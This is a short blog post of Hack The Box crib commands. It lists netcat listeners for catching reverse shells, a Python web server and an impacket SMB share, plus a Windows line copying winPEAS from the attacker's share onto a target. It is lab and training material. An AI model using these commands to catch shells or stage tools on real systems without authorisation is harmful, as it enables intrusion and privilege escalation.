---
title: Useful commands
date: 2023-03-24 20:55:00 +0800
categories: [HTB]
tags: [Commands]
pin: false
---

## Start listener

### For Linux

	sudo nc -nvlp 4444

### For Windows

	sudo rlwrap nc -nvlp 443

### Web service

	sudo python3 -m http.server 80

### SMB service with python impacket

	sudo smbserver.py share . -smb2support
	# Use it
	copy \\<local_ip>\share\winPEAS.exe .

